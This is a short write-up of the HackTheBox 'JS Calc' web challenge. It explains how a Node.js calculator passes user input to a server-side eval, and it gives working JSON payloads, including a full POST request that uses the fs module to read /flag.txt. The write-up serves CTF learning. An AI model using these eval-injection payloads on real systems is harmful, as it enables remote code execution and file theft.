---
title: HTB - JS Calc - web - easy
published: true
category: web
tags: [rce, nodejs]
difficulty: easy
seo_description: "HackTheBox JSCalc web challenge writeup. Server-side JavaScript eval injection leading to RCE and flag file read via Node.js fs module."
seo_keywords:
  - HackTheBox
  - HTB JSCalc
  - CTF writeup
  - web security
  - JavaScript eval injection
  - Node.js RCE
  - server-side code execution
  - fs module exploit
---


Our input is passed directly to eval in `challenge/helpers/calculatorHelper.js:5`. The following payload will return to us `1` in the `message` and `console.log` in the `node` environment console:

```json
{
    "formula": "(() => {console.log(1); return 1;})()"
}
```

This input results in the following interpolated string:

```js
eval(`(function() { return (() => {console.log(1); return 1;})() ;}())`);
```

which for readability I will write as:

```js
(function() { return (() => {console.log(1); return 1;})() ;}())
```

This is basically a self-executing function that returns the result of the inner function in javascript. so basically what is happening is:
```js
console.log(1);
return 1;
```

When inspecting Docker container's filesystem, we can see that the flag is stored in `/flag.txt`, in order to read files in nodejs we can use `fs` module. After submitting:

```js
const fs = require('fs');
const flag = fs.readFileSync('/flag.txt', 'utf8');
return flag;
```

We get the flag in the response of the request:

```json
POST /api/calculate HTTP/1.1
Host: <host>
Content-Type: application/json

{
    "formula": "(() => {const fs = require('fs');const flag = fs.readFileSync('/flag.txt', 'utf8');return flag;})()"
}
```

We get the flag in response.
